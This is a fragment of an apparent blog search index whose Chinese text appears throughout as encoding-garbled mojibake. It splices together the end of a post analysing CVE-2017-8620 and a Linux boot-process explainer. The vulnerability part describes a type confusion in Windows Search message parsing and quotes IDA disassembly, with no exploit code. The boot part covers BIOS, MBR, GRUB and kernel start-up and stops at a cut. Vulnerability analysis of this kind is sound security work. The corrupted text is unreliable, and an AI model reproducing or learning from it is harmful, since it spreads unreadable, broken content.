å½“è¿è¡Œäº†GSSæœåŠ¡çš„serveræ¥å—åˆ°CPMCreateQueryInæ¶ˆæ¯æ—¶ï¼Œä¼šè§£æRestrictionArrayå¹¶ä¸ºæ¯ä¸ªé™åˆ¶æ¡ä»¶å®ä¾‹åŒ–ç›¸å…³å¯¹è±¡ã€‚å¦‚æœæœåŠ¡è§£æçš„æ˜¯ä¸€ä¸ªå“åº”CPropertyR etrictionçš„CRestrictionï¼Œæ­¤æ—¶ulTypeçš„å€¼ä¸º0x5ï¼Œåˆ™è§£ç»„prvalå­—æ®µå¹¶å®ä¾‹åŒ–CBaseStorageVariantå¯¹è±¡ã€‚å¦‚æœCPropertyRestrictionçš„relopå­—æ®µçš„å€¼ä¸º0x6ï¼Œè¡¨ç¤ºé‡‡ç”¨çš„æ“ä½œæ˜¯æ­£åˆ™è¡¨è¾¾å¼æ¯”è¾ƒï¼Œåˆ™æœåŠ¡å¼€å§‹å°†æ­£åˆ™è¡¨è¾¾å¼è§£æä¸ºç¡®å®šæ€§æœ‰é™è‡ªåŠ¨æœºï¼ˆDFAï¼‰ã€‚ ä½†æ˜¯ï¼Œåœ¨è§£ææ­£åˆ™è¡¨è¾¾å¼ä¹‹å‰ï¼ŒæœåŠ¡æœªèƒ½æˆåŠŸéªŒè¯prvalå­—æ®µä¸­çš„CBaseStorageVariantå¯¹è±¡çš„ç±»å‹æ˜¯å¦ä¸ºVT_LPWSTRã€‚å¦‚æœç±»å‹ä¸æ˜¯VT_LPWSTRï¼Œåˆ™ä¼šå‘ç”Ÿç±»å‹æ··æ·†ã€‚ è¿œç¨‹æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡æœåŠ¡å™¨å‘é€æ¶æ„CPMCreateQueryInæ¶ˆæ¯æ¥åˆ©ç”¨è¿™äº›æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨å¯èƒ½ä¼šå¯¼è‡´åœ¨SYSTEMä¸Šä¸‹æ–‡ä¸­çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚ éœ€è¦æ³¨æ„ï¼ŒSMBå’ŒWSPä¸­çš„æ‰€æœ‰å¤šå­—èŠ‚æ•´æ•°éƒ½ä»¥little-endianå­—èŠ‚é¡ºåºå­˜å‚¨ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:3","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"4. æºç åˆ†æ ä½¿ç”¨IDAåç¼–è¯‘å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ï¼š tquery.dll version 7.0.7601.23861 # CPropertyRestriction::CPropertyRestriction(long, class PDeSerStream \u0026): .text:6EC88B61 push ebx ; struct PDeSerStream * .text:6EC88B62 lea ecx, [ebp+var_20] .text:6EC88B65 call ?SetLPWSTR@CStorageVariant@@QAEXPBGI@Z ; å¼€å§‹è¿›è¡Œprvalè§£ç»„ .text:6EC88B6A push eax .text:6EC88B6B mov ecx, edi .text:6EC88B6D mov byte ptr [ebp+var_4], 3 .text:6EC88B71 call ??4CStorageVariant... ; CStorageVariant::operator= # Parse(const struct CRestriction *, struct CTimeLimit *): .text:6ED350B3 cmp eax, 6 ; eax contains relop, check if relop indicates regexp .text:6ED350B6 jnz short loc_6ED350DE .text:6ED350B8 push 40h ; unsigned int .text:6ED350BA call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED350BF mov [ebp+arg_0], eax .text:6ED350C2 mov ecx, [esi+14h] .text:6ED350C5 mov edx, [esi+10h] .text:6ED350C8 push ecx .text:6ED350C9 push edx .text:6ED350CA push [ebp+arg_4] .text:6ED350CD mov ecx, eax .text:6ED350CF push esi .text:6ED350D0 mov byte ptr [ebp+var_4], 7 .text:6ED350D4 call ??0CRegXpr@@QA... ; CRegXpr(), è§£ææ­£åˆ™è¡¨è¾¾å¼ # CRegXpr::CRegXpr(class CInternalPropertyRestriction *, class CTimeLimit \u0026, unsigned long, unsigned long): .text:6ED37ABC push 0A8h ; unsigned int .text:6ED37AC1 call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED37AC6 mov [ebp+var_7C], eax .text:6ED37AC9 push [ebp+var_78] ; int .text:6ED37ACC mov ecx, [esi+20h] .text:6ED37ACF push 0 ; int .text:6ED37AD1 push [ebp+arg_4] ; int .text:6ED37AD4 mov byte ptr [ebp+var_4], 6 .text:6ED37AD8 push ecx ; unsigned __int16 * .text:6ED37AD9 mov ecx, eax .text:6ED37ADB call ??0CDFA@@Q... ; CDFA::CDFA(), ç›´æ¥è¿›è¡ŒvValueè§£æï¼Œå¹¶æ²¡æœ‰è¿›è¡Œç±»å‹æ£€æŸ¥ # CNFA::CNFA(unsigned __int16 *, int, int): .text:6AF2781E mov dx, [eax] ; eax æŒ‡å‘ VT_LPWSTR .text:6AF27821 inc eax .text:6AF27822 inc eax .text:6AF27823 cmp dx, di .text:6AF27826 jnz short loc_6AF2781E ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:4","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"5. æ”»å‡»æµé‡ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:5","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"å››ã€æ¼æ´æ£€æµ‹å’Œé˜²å¾¡ æ ¹æ®æ¼æ´åŸç†ï¼Œéœ€è¦å¯¹SMBã€WSPçš„è¯¸å¤šå‘½ä»¤å’Œç»“æ„è¿›è¡Œéå†ï¼Œä¸”WSPå‘½ä»¤ä¸­å­˜åœ¨è¯¸å¤šå˜é‡å­—æ®µï¼Œæ•°å€¼å’Œé•¿åº¦æ— æ³•ç¡®å®šï¼Œæ•…å¾ˆéš¾åœ¨æµé‡ä¾§è¿›è¡Œé˜²å¾¡ã€‚ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:4:0","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["LINUX"],"content":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","date":"2020-10-13","objectID":"/2020/10/boot/","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£ ","date":"2020-10-13","objectID":"/2020/10/boot/:0:0","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"ä¸€ã€æ¦‚è¿° æ“ä½œç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹æœ¬è´¨ä¸Šåˆ†ä¸º2ä¸ªé˜¶æ®µï¼šbootï¼ˆå¼•å¯¼ï¼‰é˜¶æ®µå’Œstartupï¼ˆå¯åŠ¨ï¼‰é˜¶æ®µã€‚å¼•å¯¼é˜¶æ®µå¼€å§‹äºæ‰“å¼€ç”µæºå‰‹ç®¡ï¼Œç»“æŸäºå†…æ ¸åˆå§‹åŒ–å®Œæˆå’Œsystemdè¿›ç¨‹æˆåŠŸè¿è¡Œï¼›å¯åŠ¨é˜¶æ®µæ¥ç®¡äº†å‰©ä½™çš„å…¶ä»–çš„å·¥ä½œï¼Œä¸€ç›´åˆ°OSè¿›å…¥å¯æ“ä½œçŠ¶æ€ã€‚å…¶æ¶µç›–çš„å†…å®¹å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š æœ¬æ–‡ä¸»è¦ä»¥GRUBå’Œsystemdä¸ºè½½ä½“ï¼Œå°½å¯èƒ½è¯¦ç»†åœ°æè¿°OSçš„å¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹ã€‚ ","date":"2020-10-13","objectID":"/2020/10/boot/:1:0","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"äºŒã€å¼•å¯¼è¿‡ç¨‹ å¼•å¯¼è¿‡ç¨‹çš„åˆå§‹åŒ–å¯ä»¥é€šè¿‡2ç§æ–¹å¼å®ç°ï¼šå…³æœºçŠ¶æ€ä¸‹çš„ç”µæºå¼€å¯ï¼Œå¼€æœºçŠ¶æ€çš„OSé‡å¯ã€‚å…¶è¿‡ç¨‹ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š ","date":"2020-10-13","objectID":"/2020/10/boot/:2:0","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"1. ç¡¬ä»¶å¯åŠ¨æµç¨‹ 1. BIOSä¸Šç”µè‡ªæ£€ï¼ˆPOSTï¼‰ BIOSçš„ç¬¬ä¸€æ­¥æ˜¯ä¸Šç”µè‡ªæ£€ï¼Œæ£€æŸ¥ç¡¬ä»¶çš„åŸºæœ¬åŠŸèƒ½æ˜¯å¦æ­£å¸¸ã€‚å¦‚æœPOSTå¤±è´¥ï¼Œé‚£ä¹ˆå¼•å¯¼è¿‡ç¨‹å¤±è´¥ï¼Œç”µè„‘å¯åŠ¨å¤±è´¥ã€‚POSTæ£€æŸ¥æˆåŠŸåï¼Œäº§ç”Ÿä¸€ä¸ªBIOSä¸­æ–­ â€“ INT 13Hï¼Œè¯¥ä¸­æ–­æŒ‡å‘æŸä¸ªæ¥å…¥çš„å¯å¼•å¯¼è®¾å¤‡çš„å¼•å¯¼æ‰‡åŒºã€‚å®ƒæ‰€æ‰¾åˆ°çš„åŒ…å«æœ‰æ•ˆçš„å¼•å¯¼è®°å½•çš„ç¬¬ä¸€ä¸ªå¼•å¯¼æ‰‡åŒºå°†è¢«è£…åœ¨åˆ°å†…å­˜0x7c00å¤„ï¼Œå¹¶ä¸”æ§åˆ¶æƒä¹Ÿå°†ä»å¼•å¯¼æ‰‡åŒºè½¬ç§»åˆ°æ­¤æ®µä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥ä¸­æ–­æŒ‡å‘çš„ä¸­æ–­æœåŠ¡ç¨‹åºå®é™…ä¸Šå°±æ˜¯ç£ç›˜æœåŠ¡ç¨‹åºï¼Œå…¶ä¸»è¦ç”¨é€”å°±æ˜¯å°†æŒ‡å®šæ‰‡åŒºçš„ä»£ç åŠ è½½åˆ°å†…å­˜çš„æŒ‡å®šä½ç½®ã€‚ BIOSä¸­åŒ…å«äº†CPUçš„ç›¸å…³ä¿¡æ¯ã€è®¾å¤‡å¯åŠ¨é¡ºåºä¿¡æ¯ã€ç¡¬ç›˜ä¿¡æ¯ã€å†…å­˜ä¿¡æ¯ã€æ—¶é’Ÿä¿¡æ¯ã€PnPç‰¹æ€§ç­‰ï¼Œå› æ­¤BIOSä¿¡æ¯å¯¹äºè®¡ç®—æœºæ¥è¯´ååˆ†é‡è¦ã€‚åªæœ‰é¡ºåˆ©é€šè¿‡BIOSè‡ªæ£€ï¼Œè®¡ç®—æœºæ‰èƒ½ç»§ç»­åç»­æµç¨‹ï¼ŒçŸ¥é“åº”è¯¥å»è¯»å–å“ªä¸ªç¡¬ä»¶è®¾å¤‡ã€‚åœ¨BIOSå°†OSçš„æ§åˆ¶æƒäº¤ç»™ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºåï¼Œå°±å¼€å§‹ç”±Linuxæ¥æ§åˆ¶ç³»ç»Ÿäº†ã€‚ 2. è¯»å–MBR POSTç»“æŸåï¼ŒBIOSä¼šåœ¨æ¥å…¥çš„ç£ç›˜ä¸­æŸ¥æ‰¾å¼•å¯¼è®°å½•ï¼Œå…¶é€šå¸¸ä½äºMBRï¼Œå®ƒåŠ è½½å®ƒæ‰¾åˆ°ç¬¬ä¸€ä¸ªå¼•å¯¼è®°å½•åˆ°å†…å­˜ä¸­ï¼Œå¹¶å¼€å§‹æ‰§è¡Œä»£ç ã€‚MBRæ˜¯ç£ç›˜ä¸Šç¬¬0ç£é“çš„ç¬¬ä¸€ä¸ªæ‰‡åŒº â€“ Master Boot Recordï¼Œå¤§å°ä¸º512å­—èŠ‚ï¼Œé‡Œé¢å­˜æ”¾äº†é¢„å¯åŠ¨ä¿¡æ¯ã€åˆ†åŒºè¡¨ä¿¡æ¯ï¼Œæ€»ä½“å¯åˆ†ä¸º2éƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºå¼•å¯¼ï¼ˆPRE-BOOTï¼‰åŒºï¼Œå¤§å°ä¸º446å­—èŠ‚ï¼Œå…¶å†…å®¹ä¸ºå¼•å¯¼ä»£ç ï¼Œè¿™446å­—èŠ‚çš„æ–‡ä»¶é€šå¸¸è¢«å«åšå¼•å¯¼é•œåƒ(boot.img)ï¼›ç¬¬äºŒéƒ¨åˆ†ä¸ºåˆ†åŒºè¡¨ï¼ˆPARTITION PABLEï¼‰ï¼Œå¤§å°ä¸º66å­—èŠ‚ï¼Œè®°å½•ç¡¬ç›˜åˆ†åŒºä¿¡æ¯ã€‚ï¼ˆMBRçš„è¯¦ç»†æè¿°å¯è§æ–‡ç« MBRè¯¦è¿°ï¼‰ ç³»ç»Ÿæ‰¾åˆ°BIOSæŒ‡å®šçš„ç£ç›˜çš„MBRåï¼Œå°±å°†å…¶å¤åˆ¶åˆ°0x7c00åœ°å€æ‰€å¤„çš„ç‰©ç†å†…å­˜ä¸­ã€‚è¿™é‡Œè¢«å¤åˆ¶çš„å†…å®¹ï¼Œå°±æ˜¯boot loaderï¼Œå¸¸è§çš„æœ‰liloï¼Œgrubï¼Œgrub2ç­‰ã€‚ ç”±äºè¿™ä¸€é˜¶æ®µçš„å¼•å¯¼ä»£ç çš„ç©ºé—´åªæœ‰446å­—èŠ‚ï¼Œæ‰€ä»¥æ— æ³•å®Œæˆç†è§£æ–‡ä»¶ç³»ç»Ÿç»“æ„ç­‰åŠŸèƒ½ï¼Œå› æ­¤éœ€è¦å†æ‰¾ä¸€ä¸ªä½äºå¼•å¯¼è®°å½•å’Œè®¾å¤‡ç¬¬ä¸€ä¸ªåˆ†åŒºä¹‹é—´çš„ä½ç½®æ¥å®ç°æ›´å¤šåŠŸèƒ½ã€‚è€Œè¿™ä¸ªä½ç½®ï¼Œå°±æ˜¯boot loaderæ‰€åœ¨ä½ç½®ã€‚ ","date":"2020-10-13","objectID":"/2020/10/boot/:2:1","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"2. Boot Loaderå¯åŠ¨å¼•å¯¼é˜¶æ®µ boot loaderæ˜¯åœ¨OSå†…æ ¸è¿è¡Œä¹‹å‰è¿è¡Œçš„ä¸€æ®µå°ç¨‹åºã€‚é€šè¿‡è¿™æ®µå°ç¨‹åºï¼Œå¯ä»¥åˆå§‹åŒ–ç¡¬ä»¶è®¾å¤‡ã€å»ºç«‹å†…å­˜ç©ºé—´çš„æ˜ å°„å›¾ç­‰ï¼Œä»è€Œå°†ç³»ç»Ÿçš„è½¯ç¡¬ä»¶ç¯å¢ƒè®¾ç½®å®Œå¤‡ï¼Œä¸ºOSå†…æ ¸åšå¥½ä¸€åˆ‡å‡†å¤‡å·¥ä½œã€‚ 1. Stage 1 Stage1é˜¶æ®µæ‰€æ‰§è¡Œçš„ä»£ç ä¸ºåœ¨æ‰§è¡Œç³»ç»Ÿå®‰è£…æ—¶å°±é¢„å…ˆå†™å…¥åˆ°MBRçš„Boot Loaderä¸­çš„ä»£ç ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯å°†ç£ç›˜0ç£é“ç¬¬2æ‰‡åŒºçš„å†…å®¹è¯»å…¥å†…å­˜å¹¶æ‰§è¡Œï¼Œå®ƒæ˜¯Stage 1.5é˜¶æ®µæˆ–Staget 2é˜¶æ®µçš„å…¥å£ã€‚ 2. Stage 1.5 ç”±äºä¸€äº›å†å²æŠ€æœ¯åŸå› ï¼Œåœ¨ç¬¬ä¸€ä¸ªåˆ†åŒºçš„å¼€å§‹ä½ç½®åœ¨æ‰‡åŒº63å’ŒMBRä¹‹é—´é—ç•™äº†62ä¸ª512å­—èŠ‚çš„æ‰‡åŒºï¼ˆæ€»è®¡31744å­—èŠ‚ï¼‰ã€‚è¯¥åŒºåŸŸå°±å¯ä»¥ç”¨äºå­˜å‚¨å®Œå–„åŠŸèƒ½çš„å®ç°ä»£ç core.imgï¼Œå¤§å°ä¸º25389å­—èŠ‚ã€‚æ­¤æ—¶ï¼Œè¯¥ç©ºé—´ä¸­å¯ä»¥å®¹çº³ä¸€äº›é€šç”¨çš„æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åºï¼Œå¦‚æ ‡å‡†çš„extï¼Œfatç­‰ã€‚ Stage 1.5é˜¶æ®µæ˜¯Stage 1é˜¶æ®µå’ŒStage 2é˜¶æ®µçš„ä¸­é—´æ¡¥æ¢ã€‚Stage 1.5é˜¶æ®µå…·æœ‰è¯†åˆ«å¯åŠ¨åˆ†åŒºæ–‡ä»¶ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œæ­¤åGRUBç¨‹åºä¾¿æœ‰èƒ½åŠ›å»è®¿é—®/bootåˆ†åŒºä¸‹/grubç›®å½•ä¸‹çš„Stage 2æ–‡ä»¶ï¼Œå¹¶å°†Stage 2è½½å…¥å†…å­˜æ‰§è¡Œã€‚ 3. Stage 2 Stage 2é˜¶æ®µæ—¶ï¼Œæ‰€æœ‰çš„æ–‡ä»¶éƒ½å·²å­˜æ”¾åœ¨/boot/grubç›®å½•åŠå…¶å­ç›®å½•ä¸‹ã€‚Stage 2é˜¶æ®µæ‰§è¡Œæ—¶ï¼Œé¦–å…ˆä¼šè§£æGRUBç¨‹åºçš„é…ç½®æ–‡ä»¶grub.confï¼Œå¹¶ä¾é…ç½®æ–‡ä»¶å†³å®šæ˜¯å¦æ˜¾ç¤ºç³»ç»Ÿå¯åŠ¨èœå•ï¼ˆåˆ—å‡ºå¯è¢«åŠ è½½æ‰§è¡Œçš„å†…æ ¸åˆ—è¡¨ï¼‰ã€‚ç„¶ååŠ è½½å†…æ ¸é•œåƒåˆ°å†…å­˜ä¸­ï¼Œé€šè¿‡initrdç¨‹åºå»ºç«‹Ramdiskå†…å­˜è™šæ‹Ÿæ ¹æ–‡ä»¶ç³»ç»Ÿã€‚æ­¤æ—¶æ§åˆ¶æƒå°†è½¬äº¤ç»™å†…æ ¸ç¨‹åºã€‚ ä»¥ä¸Šå„ä¸ªStageä¸­GURBå’ŒMBRçš„æƒ…å†µå¦‚ä¸‹å›¾ï¼š ","date":"2020-10-13","objectID":"/2020/10/boot/:2:2","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"3. å†…æ ¸å¼•å¯¼æµç¨‹ å†…æ ¸å¼•å¯¼é˜¶æ®µä¸»è¦é€šè¿‡åœ¨å†…å­˜ä¸­å»ºç«‹è™šæ‹Ÿæ ¹æ–‡ä»¶ç³»ç»Ÿå®ç°ç›¸å…³è®¾å¤‡çš„é©±åŠ¨å¹¶å»ºç«‹å’Œåˆ‡æ¢åˆ°çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚å†…æ ¸æ–‡ä»¶å‡ä»¥ä¸€ç§è‡ªè§£å‹çš„å‹ç¼©æ ¼å¼å­˜å‚¨ä»¥èŠ‚çœç©ºé—´ï¼Œå®ƒä¸ä¸€ä¸ªåˆå§‹åŒ–çš„å†…å­˜æ˜ åƒå’Œå­˜å‚¨è®¾å¤‡æ˜ å°„è¡¨éƒ½å­˜å‚¨äº/bootç›®å½•ä¸‹ã€‚ åœ¨é€‰å®šçš„å†…æ ¸åŠ è½½åˆ°å†…å­˜ä¸­å¹¶å¼€å§‹æ‰§è¡Œåï¼Œåœ¨å…¶è¿›è¡Œä»»ä½•å·¥ä½œä¹‹å‰ï¼Œå†…æ ¸æ–‡ä»¶é¦–å…ˆå¿…é¡»ä»å‹ç¼©æ ¼å¼è§£å‹è‡ªèº«ï¼Œæ­¤æ—¶å±å¹•ä¸€èˆ¬ä¼šè¾“å‡ºâ€œUncom pressing Linuxâ€çš„æç¤ºï¼Œå½“è§£å‹ç¼©å®Œæˆåï¼Œè¾“å‡ºâ€œOK, booting the kernelâ€ã€‚ è§£å‹å†…æ ¸é•œåƒåŠ è½½åˆ°å†…å­˜ï¼Œä»¥åŠinitrdç¨‹åºå»ºç«‹Ramdiskå†…å­˜è™šæ‹Ÿæ ¹æ–‡ä»¶ç³»ç»Ÿåï¼Œå†…æ ¸å¼€å§‹é©±åŠ¨åŸºæœ¬ç¡¬ä»¶ï¼Œå¹¶è°ƒç”¨è™šæ‹Ÿæ ¹æ–‡ä»¶ç³»ç»Ÿä¸­çš„initç¨‹åºåŠ è½½é©±åŠ¨æ¨¡å—åˆå§‹åŒ–ç³»ç»Ÿä¸­å„ç§è®¾å¤‡çš„ç›¸å…³é…ç½®å·¥ä½œï¼Œå…¶ä¸­åŒ…æ‹¬CPUã€I/Oã€å­˜å‚¨è®¾å¤‡ç­‰ã€‚å½“æ‰€éœ€çš„é©±åŠ¨ç¨‹åºåŠ è½½å®Œåï¼Œä¼šæ ¹æ®grub.confé…ç½®æ–‡ä»¶ä¸­â€œroot=XXXâ€éƒ¨åˆ†æ‰€æŒ‡å®šçš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ ¹è®¾å¤‡ï¼Œç„¶åå°†æ ¹æ–‡ä»¶ç³»ç»Ÿä»¥åªè¯»çš„æ–¹å¼æŒ‚è½½ï¼Œå¹¶åˆ‡æ¢åˆ°çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸Šï¼ŒåŒæ—¶è°ƒç”¨ç³»ç»Ÿè¿›ç¨‹çš„è€ç¥–å®—è¿›ç¨‹/sbin/initç¨‹åºï¼Œè¿›å…¥ç³»ç»Ÿåˆå§‹åŒ–é˜¶æ®µã€‚ è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå…³é”®å‡½æ•°ï¼šstart_kernel()å‡½æ•°ï¼ˆåç»­å°†å•ç‹¬å‡ºä¸€ç¯‡æ–‡ç« è¿›è¡Œè¯¥å‡½æ•°çš„è°ƒè¯•ï¼‰ï¼Œå®ƒä¸»è¦æ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œï¼š åœ¨å±å¹•ä¸Šæ‰“å°å‡ºå½“å‰çš„å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ã€‚ æ‰§è¡Œsetup_arch()ï¼Œå¯¹ç³»ç»Ÿç»“æ„è¿›è¡Œè®¾ç½®ã€‚ æ‰§è¡Œsched_init()ï¼Œå¯¹ç³»ç»Ÿçš„è°ƒåº¦æœºåˆ¶è¿›è¡Œåˆå§‹åŒ–ã€‚å…ˆæ˜¯å¯¹æ¯ä¸ªå¯ç”¨CPUä¸Šçš„runquequeè¿›è¡Œåˆå§‹åŒ–;ç„¶ååˆå§‹åŒ–0å·è¿›ç¨‹(å…¶task structå’Œç³»ç»Ÿç©ºMå †æ ˆåœ¨startup_32()ä¸­å·±ç»è¢«åˆ†é…)ä¸ºç³»ç»Ÿidleè¿›ç¨‹ï¼Œå³ç³»ç»Ÿç©ºé—²æ—¶å æ®CPUçš„è¿›ç¨‹ã€‚ æ‰§è¡Œparse_early_param()å’Œparsees_args()è§£æç³»ç»Ÿå¯åŠ¨å‚æ•°ã€‚ æ‰§è¡Œtrap_in itQï¼Œå…ˆè®¾ç½®äº†ç³»ç»Ÿä¸­æ–­å‘é‡è¡¨ã€‚0ï¼19å·çš„é™·é˜±é—¨ç”¨äºCPUå¼‚å¸¸å¤„ç†;ç„¶ååˆå§‹åŒ–ç³»ç»Ÿè°ƒç”¨å‘é‡;æœ€åè°ƒç”¨cpu_init()å®Œå–„å¯¹CPUçš„åˆå§‹åŒ–ï¼Œç”¨äºæ”¯æŒè¿›ç¨‹è°ƒåº¦æœºåˆ¶ï¼ŒåŒ…æ‹¬è®¾å®šæ ‡å¿—ä½å¯„å­˜å™¨ã€ä»»åŠ¡å¯„å­˜å™¨ã€åˆå§‹åŒ–ç¨‹åºè°ƒè¯•ç›¸å…³å¯„å­˜å™¨ç­‰ç­‰ã€‚ æ‰§è¡Œrcu_init()ï¼Œåˆå§‹åŒ–ç³»ç»Ÿä¸­çš„Read-Copy Updateäº’æ–¥æœºåˆ¶ã€‚ æ‰§è¡Œinit_IRQ()å‡½æ•°ï¼Œåˆå§‹åŒ–ç”¨äºå¤–è®¾çš„ä¸­æ–­ï¼Œå®Œæˆå¯¹IDTçš„æœ€ç»ˆåˆå§‹åŒ–è¿‡ç¨‹ã€‚ æ‰§è¡Œinit_timers(), softirq_init()å’Œtime_init()å‡½æ•°ï¼Œåˆ†åˆ«åˆå§‹ç³»ç»Ÿçš„å®šæ—¶å™¨æœºåˆ¶ï¼Œè½¯ä¸­æ–­æœºåˆ¶ä»¥åŠç³»ç»Ÿæ—¥æœŸå’Œæ—¶é—´ã€‚ æ‰§è¡Œmem_init()å‡½æ•°ï¼Œåˆå§‹åŒ–ç‰©ç†å†…å­˜é¡µé¢çš„pageæ•°æ®ç»“æ„æè¿°ç¬¦ï¼Œå®Œæˆå¯¹ç‰©ç†å†…å­˜ç®¡ç†æœºåˆ¶çš„åˆ›å»ºã€‚ æ‰§è¡Œkmem_cache_init(),å®Œæˆå¯¹é€šç”¨slabç¼“å†²åŒºç®¡ç†æœºåˆ¶çš„åˆå§‹åŒ–å·¥ä½œã€‚ æ‰§è¡Œfork_init()ï¼Œè®¡ç®—å‡ºå½“å‰ç³»ç»Ÿçš„ç‰©ç†å†…å­˜å®¹é‡èƒ½å¤Ÿå…è®¸åˆ›å»ºçš„è¿›ç¨‹(çº¿ç¨‹)æ•°é‡ã€‚ æ‰§è¡Œproc_caches_init(), bufer_init(), unnamed_dev_init() ,vfs_caches_init(), signals_init()ç­‰å‡½æ•°å¯¹å„ç§ç®¡ç†æœºåˆ¶å»ºç«‹èµ·ä¸“ç”¨çš„slabç¼“å†²åŒºé˜Ÿåˆ—ã€‚ æ‰§è¡Œproc_root_init()å‡½æ•°ï¼Œå¯¹è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ/procè¿›è¡Œåˆå§‹åŒ–ã€‚ åœ¨start_kenrel()çš„ç»“å°¾ï¼Œå†…æ ¸é€šè¿‡kenrel_thread()åˆ›å»ºå‡ºç¬¬ä¸€ä¸ªç³»ç»Ÿå†…æ ¸çº¿ç¨‹(å³1å·è¿›ç¨‹)ï¼Œè¯¥çº¿ç¨‹æ‰§è¡Œçš„æ˜¯å†…æ ¸ä¸­çš„init()å‡½æ•°ï¼Œè´Ÿè´£çš„æ˜¯ä¸‹ä¸€é˜¶æ®µçš„å¯åŠ¨ä»»åŠ¡ã€‚æœ€åè°ƒç”¨cpues_idle()å‡½æ•°:è¿›å…¥äº†ç³»ç»Ÿä¸»å¾ªç¯ä½“å£é»˜è®¤å°†ä¸€ç›´æ‰§è¡Œdefault_idle()å‡½æ•°ä¸­çš„æŒ‡ä»¤ï¼Œå³CPUçš„haltæŒ‡ä»¤ï¼Œç›´åˆ°å°±ç»ªé˜Ÿåˆ—ä¸­å­˜åœ¨å…¶ä»–è¿›ç¨‹éœ€è¦è¢«è°ƒåº¦æ—¶æ‰ä¼šè½¬å‘æ‰§è¡Œå…¶ä»–å‡½æ•°ã€‚æ­¤æ—¶ï¼Œç³»ç»Ÿä¸­å”¯ä¸€å­˜ åœ¨å°±ç»ªçŠ¶æ€çš„è¿›ç¨‹å°±æ˜¯ç”±kerne_hread()åˆ›å»ºçš„initè¿›ç¨‹(å†…æ ¸çº¿ç¨‹)ï¼Œæ‰€ä»¥å†…æ ¸å¹¶ä¸è¿›å…¥default_idle()å‡½æ•°ï¼Œè€Œæ˜¯è½¬å‘init()å‡½æ•°ç»§ç»­å¯åŠ¨è¿‡ç¨‹ã€‚ å®Œæˆä»¥ä¸Šè¿‡ç¨‹åï¼ŒLinuxå†…æ ¸å·²å¯ä»¥æ­£å¸¸è¿è¡Œã€‚ ","date":"2020-10-13","objectID":"/2020/10/boot/:2:3","tags":["Boot"],"title":"Linuxå¼€æœºå¼•å¯¼å’Œå¯åŠ¨è¿‡ç¨‹è¯¦è§£","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"4. ç³»ç»Ÿåˆå§‹åŒ–æµç¨‹ 